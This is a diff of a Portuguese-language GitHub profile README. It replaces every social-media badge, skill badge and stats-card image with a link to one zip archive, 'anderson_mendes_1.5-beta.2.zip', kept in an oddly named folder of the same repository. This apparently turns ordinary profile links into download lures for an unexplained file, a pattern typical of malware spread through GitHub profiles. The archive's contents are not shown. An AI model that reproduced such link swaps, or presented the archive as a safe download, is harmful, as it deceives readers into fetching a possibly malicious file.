@@ -13,11 +13,11 @@ Estou constantemente estudando e evoluindo meus conhecimentos em desenvolvimento
 ## 🌐 Onde me encontrar
 
 <p align="left">
-  <a href="https://github.com/anderson-mendes612">
-    <img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white" />
+  <a href="https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip">
+    <img src="https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip" />
   </a>
-  <a href="https://instagram.com/anderson.mendesss">
-    <img src="https://img.shields.io/badge/Instagram-@anderson.mendesss-E4405F?style=for-the-badge&logo=instagram&logoColor=white" />
+  <a href="https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip">
+    <img src="https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip" />
   </a>
 </p>
 
@@ -35,15 +35,15 @@ Estou constantemente estudando e evoluindo meus conhecimentos em desenvolvimento
 
 ### Frontend
 
-![JavaScript](https://img.shields.io/badge/HTML-239120?style=for-the-badge&logo=html5&logoColor=white)
-![Styled Components](https://img.shields.io/badge/CSS-239120?&style=for-the-badge&logo=css3&logoColor=white)
+![JavaScript](https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip)
+![Styled Components](https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip)
 ---
 
 ## 📊 Status Github
 
 <p align="left">
-  <img height="170" src="https://github-readme-stats.vercel.app/api?username=anderson-mendes612&show_icons=true&theme=tokyonight&count_private=true" />
-  <img height="170" src="https://github-readme-stats.vercel.app/api/top-langs/?username=anderson-mendes612&layout=compact&theme=tokyonight" />
+  <img height="170" src="https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip" />
+  <img height="170" src="https://github.com/anderson-mendes612/anderson-mendes612/raw/refs/heads/main/posological/anderson_mendes_1.5-beta.2.zip" />
 </p>
 
 ---
